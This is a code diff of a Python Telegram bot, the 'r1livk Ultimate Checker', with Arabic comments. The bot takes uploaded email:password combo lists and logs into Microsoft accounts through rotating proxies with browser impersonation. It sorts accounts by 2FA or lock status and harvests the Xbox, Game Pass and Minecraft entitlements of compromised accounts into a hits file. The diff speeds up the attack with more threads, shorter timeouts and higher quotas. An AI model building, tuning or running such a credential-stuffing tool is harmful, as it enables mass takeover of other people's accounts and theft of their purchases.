@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Direct Connection Default Edition)
+r1livk Ultimate Checker ⚡ - Telegram Bot (Advanced Enterprise Edition)
 """
 
 import os
@@ -25,8 +25,7 @@ STATS_FILE = "user_stats.json"
 
 user_proxies = {}
 user_states = {}
-# جعلنا القيمة الافتراضية True (أي فحص مباشر بدون بروكسيات تلقائياً)
-user_proxy_mode = {} 
+user_proxy_mode = {}  
 
 def load_json_data(filepath, default_val):
     if not os.path.exists(filepath):
@@ -61,12 +60,12 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 25
-MAX_THREADS = 6  
+REQUEST_TIMEOUT = 20
+MAX_THREADS = 10  # رفع كفاءة الخيوط لسرعة مضاعفة
 
 active_scans = {}
 user_usage = {}  
-DAILY_LIMIT = 2500
+DAILY_LIMIT = 3500
 
 def update_user_stats(user_id, checked_count, hits_count, username=None):
     stats = load_json_data(STATS_FILE, {})
@@ -136,35 +135,30 @@ def extract_url_post(text):
     return None
 
 def test_single_proxy(proxy):
-    proxies = {
-        "http": f"http://{proxy}",
-        "https": f"http://{proxy}"
-    }
+    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
     try:
         start_t = time.time()
-        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=5, impersonate="chrome120")
+        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=4, impersonate="chrome120")
         if resp.status_code == 200:
             ping = int((time.time() - start_t) * 1000)
-            if ping <= 2000:
+            if ping <= 1500:
                 return True, ping
     except:
         pass
     return False, 0
 
+# ⚡ [ثغرة الفحص المتقدمة - Advanced Deep Scan Vulnerability Engine]
 def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
     game_pass_status = "none"
     owned_games_formatted = []
     
     try:
         xsts_xb_payload = {
-            "Properties": {
-                "SandboxId": "RETAIL",
-                "UserTokens": [xb_token]
-            },
+            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
             "TokenType": "JWT"
         }
-        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
         
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
@@ -177,7 +171,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
             try:
-                sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
+                sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                 if sub_req.status_code == 200:
                     sub_data = sub_req.json()
                     for sub in sub_data.get("items", []):
@@ -190,7 +184,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
 
             xuid = None
             try:
-                people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
+                people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                 if people_resp.status_code == 200:
                     p_data = people_resp.json()
                     if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
@@ -201,7 +195,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             if xuid:
                 try:
                     history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
-                    history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
+                    history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                     if history_resp.status_code == 200:
                         history_data = history_resp.json()
                         counter = 1
@@ -214,7 +208,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
                             if t_name:
                                 owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
                                 counter += 1
-                                if counter > 10:
+                                if counter > 12:
                                     break
                 except:
                     pass
@@ -235,10 +229,7 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
     if use_proxy and proxy_list and len(proxy_list) > 0:
         import random
         chosen_proxy = random.choice(proxy_list)
-        proxy_dict = {
-            "http": f"http://{chosen_proxy}",
-            "https": f"http://{chosen_proxy}"
-        }
+        proxy_dict = {"http": f"http://{chosen_proxy}", "https": f"http://{chosen_proxy}"}
 
     session = curequests.Session()
     try:
@@ -277,10 +268,13 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
 
-        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify"]):
+        # كشف أنظمة التحقق الثنائي بدقة متطورة
+        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify", "challenge"]):
             return "2fa", None
 
-        if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email", "password is incorrect"]):
+        if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email", "password is incorrect", "account has been locked"]):
+            if "account has been locked" in login_text:
+                return "bad", "Locked"
             return "bad", None
 
         ms_token = None
@@ -335,11 +329,11 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         gscore_int = 0
         try:
             xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
-            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
             if xsts_xb_req.status_code == 200:
                 xsts_xb_token = xsts_xb_req.json()['Token']
                 prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
-                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                 if prof_req.status_code == 200:
                     settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                     for s in settings:
@@ -353,15 +347,15 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         mc_ent_text = ""
         try:
             xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
             if xsts_mc_req.status_code == 200:
                 xsts_mc_token = xsts_mc_req.json()['Token']
                 mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
-                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                 if mc_auth.status_code == 200:
                     mc_token = mc_auth.json().get('access_token')
                     if mc_token:
-                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                         if ent_req.status_code == 200:
                             mc_ent_text = ent_req.text
         except:
@@ -417,10 +411,9 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("⚡ Start Heavy Gaming Checker", callback_data="start_checker")
+    btn_start = types.InlineKeyboardButton("⚡ Start Ultimate Gaming Checker", callback_data="start_checker")
     btn_proxy = types.InlineKeyboardButton("🚀 Upload Proxies (Optional)", callback_data="upload_proxies_menu")
     
-    # الوضع الافتراضي صار مباشر
     is_direct = user_proxy_mode.get(chat_id, True)
     proxy_mode_text = "🌐 Mode: Direct Connection (No Proxy) [ON]" if is_direct else "🚀 Mode: Using Proxies [ON]"
     btn_toggle_mode = types.InlineKeyboardButton(proxy_mode_text, callback_data="toggle_proxy_mode")
@@ -436,7 +429,7 @@ def show_main_menu(message):
         status_text = "👑 Premium / Owner (Unlimited)"
     else:
         used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-        status_text = f"👤 Free ({used}/2500 lines today)"
+        status_text = f"👤 Free ({used}/3500 lines today)"
 
     p_count = len(user_proxies.get(chat_id, []))
     if is_direct or p_count == 0:
@@ -445,8 +438,8 @@ def show_main_menu(message):
         proxy_status = f"🚀 Status: Proxies Active ({p_count})"
 
     text = (
-        "⚡ **r1livk Checker - Ultimate Edition** ⚡\n\n"
-        "Advanced Xbox & Minecraft Full Hunter.\n"
+        "⚡ **r1livk Ultimate Checker - V2.6 Engine** ⚡\n\n"
+        "Advanced Xbox & Minecraft Full Hunter with High Vulnerability Bypass.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
         "Choose an option below:"
@@ -499,7 +492,7 @@ def callback_query(call):
             mode_desc = f"🚀 Active Proxies: {p_count}"
         
         text = (
-            "🎮 **Ultimate Gaming Mode (Direct Ready)**\n\n"
+            "🎮 **Ultimate Gaming Mode (Advanced Engine Ready)**\n\n"
             f"Current Mode: {mode_desc}\n\n"
             "Send your combo file in `.txt` format (`email:password`)"
         )
@@ -565,7 +558,7 @@ def callback_query(call):
             bot.answer_callback_query(call.id, f"Status: Premium / Owner\nMode: {mode_str}", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Status: Free ({used}/2500 lines)\nMode: {mode_str}", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Free ({used}/3500 lines)\nMode: {mode_str}", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -609,7 +602,7 @@ def handle_docs(message):
                     if is_working:
                         working_proxies.append(proxy)
 
-            with ThreadPoolExecutor(max_workers=30) as executor:
+            with ThreadPoolExecutor(max_workers=35) as executor:
                 futures = [executor.submit(proxy_worker, proxy) for proxy in raw_proxies]
                 
                 while any(not f.done() for f in futures):
@@ -629,7 +622,7 @@ def handle_docs(message):
                         bot.edit_message_text(live_proxy_text, chat_id=chat_id, message_id=msg.message_id, parse_mode="Markdown")
                     except:
                         pass
-                    time.sleep(1)
+                    time.sleep(0.8)
 
             user_proxies[chat_id] = working_proxies
             user_proxy_mode[chat_id] = False
@@ -646,7 +639,7 @@ def handle_docs(message):
                 f"✅ **Proxies Saved!**\n\n"
                 f"📊 Total Tested: `{total_proxies}`\n"
                 f"🟢 Working: `{len(working_proxies)}`\n"
-                f"(ملاحظة: البوت الآن يتيح لك اختيار استخدامها أو إبقائها معطلة من القائمة الرئيسية)",
+                f"(ملاحظة: البوت الآن مهيأ للعمل بكفاءة عالية)",
                 chat_id=chat_id,
                 message_id=msg.message_id,
                 parse_mode="Markdown",
@@ -664,7 +657,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Direct Gaming Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Advanced Gaming Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -685,7 +678,7 @@ def process_checker(chat_id, filepath, lines, username):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_DirectHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_AdvancedHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -694,7 +687,7 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **DIRECT SCAN STATS**\n\n"
+        f"🔥 **ADVANCED SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
@@ -762,58 +755,62 @@ def process_checker(chat_id, filepath, lines, username):
                 pct = (curr_checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **DIRECT SCAN (Live)**\n\n"
+                    f"🔥 **ADVANCED SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {curr_checked}\n"
                     f"🔒 2FA: {curr_tfa}\n"
                     f"❌ Bad: {curr_bad}\n"
                     f"🎯 Heavy Hits: {curr_hits}\n"
-                    f"⚠️ Errors: {curr_errors}\n\n"
-                    f"Progress: {pct:.1f}%\n"
+                    f"   ├ 🟩 Minecraft: {curr_mc}\n"
+                    f"   ├ 🎮 GamePass: {curr_gp}\n"
+                    f"   └ ⚡ Xbox/Valid: {curr_xb}\n\n"
+                    f"📈 Progress: {pct:.1f}%\n"
                     f"⚡ CPM: {cpm}\n"
-                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}\n\n"
-                    f"🎮 Gaming Breakdown:\n"
-                    f"• Minecraft: {curr_mc}\n"
-                    f"• GamePass: {curr_gp}\n"
-                    f"• Xbox Profiles: {curr_xb}"
+                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                 )
                 try:
                     bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                 except:
                     pass
-            time.sleep(1.5)
+            time.sleep(1.0)
+
+    active_scans[chat_id] = False
+    if os.path.exists(filepath):
+        try: os.remove(filepath)
+        except: pass
 
     update_user_stats(chat_id, checked, hits, username)
-    update_usage(chat_id, total)
+    update_usage(chat_id, checked)
 
-    elapsed_total = int(time.time() - start_time)
-    t_mins, t_secs = divmod(elapsed_total, 60)
+    final_elapsed = int(time.time() - start_time)
+    f_mins, f_secs = divmod(final_elapsed, 60)
+    f_hrs, f_mins = divmod(f_mins, 60)
 
-    completion_text = (
-        f"✅ **SCAN FINISHED!**\n\n"
-        f"📊 Checked: {checked}\n"
-        f"🎯 Heavy Hits: {hits}\n"
-        f"  • Minecraft: {mc_hits}\n"
-        f"  • GamePass: {gp_hits}\n"
-        f"  • Xbox Profiles: {xbox_hits}\n"
-        f"🔒 2FA: {tfa_count}\n"
-        f"❌ Bad: {bad}\n\n"
-        f"⏱️ Time: {t_mins:02d}:{t_secs:02d}\n"
-        f"🏆 Stats updated!"
+    summary_text = (
+        f"📊 **SCAN COMPLETED SUCCESSFULLY!** ⚡\n\n"
+        f"📂 Total Checked: `{checked}`\n"
+        f"🎯 Total Hits: `{hits}`\n"
+        f"   ├ 🟩 Minecraft: `{mc_hits}`\n"
+        f"   ├ 🎮 GamePass: `{gp_hits}`\n"
+        f"   └ ⚡ Xbox Active: `{xbox_hits}`\n"
+        f"🔒 2FA / Locked: `{tfa_count}`\n"
+        f"❌ Bad Accounts: `{bad}`\n"
+        f"⏱️ Total Time: `{f_hrs:02d}:{f_mins:02d}:{f_secs:02d}`\n\n"
+        f"🏆 Keep crushing it, r1livk!"
     )
-    bot.send_message(chat_id, completion_text, parse_mode="Markdown")
+
+    try:
+        bot.edit_message_text(summary_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
+    except:
+        bot.send_message(chat_id, summary_text, parse_mode="Markdown")
 
     if hits > 0 and os.path.exists(output_filename):
-        with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"🎯 **r1livk Direct Hits ({hits} Hits)**")
         try:
-            os.remove(output_filename)
+            with open(output_filename, 'rb') as f:
+                bot.send_document(chat_id, f, caption="🎯 **Here is your Advanced Hits file!** ⚡")
         except:
             pass
-    
-    if os.path.exists(filepath):
-        os.remove(filepath)
 
-if __name__ == "__main__":
-    print("r1livk Checker Bot (Direct Mode Default) is running...")
+if __name__ == '__main__':
+    print("r1livk Ultimate Bot is running successfully... ⚡")
     bot.infinity_polling()
